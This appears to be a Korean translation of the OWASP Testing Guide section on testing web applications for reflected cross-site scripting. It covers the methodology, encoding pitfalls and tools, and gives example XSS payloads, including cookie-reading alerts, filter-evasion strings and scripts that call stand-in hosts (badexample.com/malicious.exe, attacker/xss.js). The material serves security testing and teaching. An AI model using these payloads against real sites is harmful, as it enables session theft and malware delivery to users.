============================================================================================
OTG-INPVAL-001 (반사형 크로스 사이트 스크립팅 테스트)
============================================================================================

|

개요
============================================================================================

반사형 크로스 사이트 스크립팅은 공격자가 HTTP 응답 데이터 안에 브라우저 실행 코드를
삽입할 때 발생합니다.
삽입 공격은 그 자신이 어플리케이션 안에 저장되지 않을 뿐아니라 지속되지 않고, 
악의적으로 조작한 링크 또는 웹 페이지에 접근하는 사용자만 영향을 줍니다.
공격 문자열은 조작한 URI 또는 HTTP 파라미터의 일부에 포함되어, 
어플리케이션에서 부적절하게 처리되어 피해자에게 리턴됩니다.

반사형 XSS는 전체적인 XSS 공격 중 가장 빈번한 공격 형태입니다.
반사형 XSS 공격은 지속적이지 않은 XSS 공격으로 잘 알려져 있고, 공격 페이로드는
싱글 요청 및 응답을 통해 실행되고 전송됩니다.
그래서, 첫번째 순서 또는 타입 1 XSS라고도 불립니다.  

웹 어플리케이션이 해당 공격 형태에 취약할 때, 클라이언트로 요청을 통해 
전송이 확인되지 않은 입력을 돌려보낼 것입니다.

The common modus operandi of the attack includes a design step, in which the 
attacker creates and tests an offending URI, a social engineering step, in
which she convinces her victims to load this URI on their browsers, and the 
eventual execution of the offending code using the victim’s browser.

일반적으로 공격자 코드는 자바스크립트 언어로 쓰여져 있지만, 그 외 스크립팅
언어도 종종 사용됩니다.(ActionScript, VBScript)
공격자는 일반적으로 키 로거 설치, 피해자 쿠키 탈취, 클립보드 탈취 수행,
또는 페이지 컨텐츠 교체를 위해 이 취약점을 이용합니다.

XSS 취약점을 막기 가장 어려운 부분은 적절한 문자 인코딩입니다.
일부 경우, 웹 서버 또는 웹 어플리케이션은 문자의 일부 인코딩을 
필터링할 수 없습니다. 
그래서, 웹 어플리케이션은 **<script>**를 필터링할 수 있지만, 
간단한 인코딩 태그를 포함한 **%3cscript%3e**를 
필터링하지 않을 수 있습니다.

|

테스트 방법
============================================================================================

|

Black Box testing
-----------------------------------------------------------------------------------------

블랙 박스 테스트는 최소한 3가지 과정을 포함해야합니다.

(1) 입력 벡터 탐지.
침투 테스터는 각각의 웹 페이지에서 모든 웹 어플리케이션의 사용자 정의 변수와 
그들이 입력되는 방법을 확인해야 합니다.
이것은 HTTP 파라미터, POST 데이터, 숨겨진 form 필드 값, 그리고 미리 정의된 radio
또는 selection 값과 같은 숨겨지거나 명백하지 않은 입력을 포함합니다.
일반적으로 브라우저 내에 HTML 에디터 또는 웹 프록시는 숨겨진 변수를 보는 데 사용할 
수 있습니다.

(2) 잠재적인 취약점을 탐지하기 위해 각각의 입력 벡터 분석.
XSS 취약점을 탐지하기 위해, 침투 테스터는 각각의 입력 벡터에 특별하게 조작한 입력 
데이터를 사용할 것입니다.
그러한 입력 데이터는 일반적으로 해롭지 않지만, 취약점이 나타난 웹 브라우저로 부터
응답 데이터가 트리거됩니다.
침투 테스트 데이터는 웹 어플리케이션 퍼저, 알려진 공격 문자열 리스트 또는 수동으로
생성될 수 있습니다.

입력 데이터 예제

.. code-block:: html

    <script>alert(123)</script>

.. code-block:: html

    "><script>alert(document.cookie)</script>

더 자세한 목록은 XSS Filter Evasion Cheat Sheet을 참고

(3) 이 전 과정에서 시도된 입력값으로, 침투 테스터는 결과를 분석할 수 있습니다. 
그리고, 웹 어플리케이션의 보안에 실제 영향을 주는 취약점을 나타내는 경우를 결정합니다.
이것은 HTML 웹 페이지 결과와 침투테스트 입력 검색 테스트가 요구됩니다.
발견되면, 침투 테스터는 인코딩된 것, 대체된 것, 또는 필터링 된 것에 대해 적합하지 않은 
특수 문자를 식별합니다.
필터링 되지 않은 취약한 특수 문자 집합은 HTML의 섹션 컨텍스트에 따라 달라집니다.

모든 HTML 특수 문자가 HTML 엔티티로 교체되는 지 식별합니다.
식별할 키 HTML 엔티티

.. code-block:: html

    > (초과)
    < (미만)
    & (앰퍼센트)
    ' (싱글 쿼트)
    " (더블 쿼트)

그러나, 엔티티의 전체 리스트는 HTML 과 XML 규격에 정의되어 있습니다. 
Wikipedia에 완벽한 reference를 가지고 있습니다.

HTML 액션 또는 자바스크립트 코드의 컨텍스트에서 다른 특수 문자 설정은 
취소, 암호화, 대체, 필터링을 해야할 것입니다.

.. code-block:: html

    \n (new line)
    \r (carriage return)
    \' (싱글 쿼트)
    \" (더블 쿼트)
    \\ (백슬래쉬)
    \uXXXX (unicode 값)

|

Example 1
-------------------------------------------------------------------------------------------

예를 들어, "Welcome %username%"를 출력하는 사이트가 있다고 합시다. 그리고,
다운로드 링크가 있습니다.

침투 테스터는 모든 데이터 입력 포인트는 XSS 공격이 발생할 수 있음을 의심해야 합니다.
그것을 분석하기 위해, 침투 테스터는 사용자 변수를 실행하고 취약점을 트리거 합니다.

다음 링크로 클릭하고 상황을 확인해봅시다.

.. code-block:: html

    http://example.com/index.php?user=<script>alert(123)</script>

만약 필터링이 없다면 다음 팝업이 결과로 발생될 것입니다.

이것은 XSS 취약점이 있다는 걸 의마하고, 침투 테스터의 링크를 클릭한다면
모든 사람의 브라우저에 테스터가 선택한 코드를 실행 할 수 있다는 걸 나타냅니다.

|

Example 2
-------------------------------------------------------------------------------------------

.. code-block:: html

    http://example.com/index.php?user=<script>window.onload=
    function() {var AllLinks=document.getElementsByTagName("a");
    AllLinks[0].href="http://badexample.com/malicious.exe";}</script>



|

Example 3
-------------------------------------------------------------------------------------------

.. code-block:: html

    <input type="text" name="state" value="INPUT_FROM_USER">

.. code-block:: html

    "onfocus="alert(document.cookie)

|

Example 4
-------------------------------------------------------------------------------------------

.. code-block:: html

    "><script>alert(document.cookie)</script>

.. code-block:: html

    "%3cscript%3ealert(document.cookie)%3c/script%3e


|

Example 5
-------------------------------------------------------------------------------------------

.. code-block:: html

    <scr<script>ipt>alert(document.cookie)</script>

|

Example 6
-------------------------------------------------------------------------------------------

.. code-block:: php

    <?
        $re = "/<script[^>]+src/i";

        if (preg_match($re, $_GET['var']))
        {
            echo "Filtered";
            return;
        }
        echo "Welcome ".$_GET['var']." !";
    ?>

.. code-block:: html

    <script src="http://attacker/xss.js"></script>

.. code-block:: html

    http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>

|

Example 7
-------------------------------------------------------------------------------------------

.. code-block:: html

    http://example/page.php?param=<script>[...]</script>


.. code-block:: html

    http://example/page.php?param=<script&param=>[...]</&param=script>


|

Gray Box testing
-------------------------------------------------------------------------------------------

Gray Box testing is similar to Black box testing. In gray box testing,
the pen-tester has partial knowledge of the application. In
this case, information regarding user input, input validation controls,
and how the user input is rendered back to the user might be
known by the pen-tester.

If source code is available (White Box), all variables received from
users should be analyzed. Moreover the tester should analyze any
sanitization procedures implemented to decide if these can be circumvented.

|

Tools
============================================================================================

- PHP Charset Encoder(PCE): http://yehg.net/encoding/
- HackVertor: http://www.businessinfo.co.uk/labs/hackvertor/
- WebScarab 
- Burp Proxy
- OWASP Zed Attack Proxy (ZAP)
- XSS-Proxy: http://xss-proxy.sourceforge.net/ 
- ratproxy: http://code.google.com/p/ratproxy/
- OWASP Xenotix XSS Exploit Framework

|

References
============================================================================================

OWASP Resources
--------------------------------------------------------------------------------------------

- XSS Filter Evasion Cheat Sheet

Books
--------------------------------------------------------------------------------------------

- Joel Scambray, Mike Shema, Caleb Sima - “Hacking Exposed Web Applications”, Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - “The Web Application’s Handbook - Discovering and Exploiting Security Flaws”, 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert “RSnake” Hansen, Petko “pdp” D. Petkov, Anton Rager, Seth Fogie - “Cross Site Scripting Attacks: XSS Exploits and Defense”, 2007, Syngress, ISBN-10: 1-59749-154-3

Whitepapers
--------------------------------------------------------------------------------------------

- CERT - Malicious HTML Tags Embedded in Client Web Requests: Read
- Rsnake - XSS Cheat Sheet: Read
- cgisecurity.com - The Cross Site Scripting FAQ: Read
- G.Ollmann - HTML Code Injection and Cross-site scripting: Read
- A. Calvo, D.Tiscornia - alert(‘A javascritp agent’): Read ( To be published )
- S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat: Read

|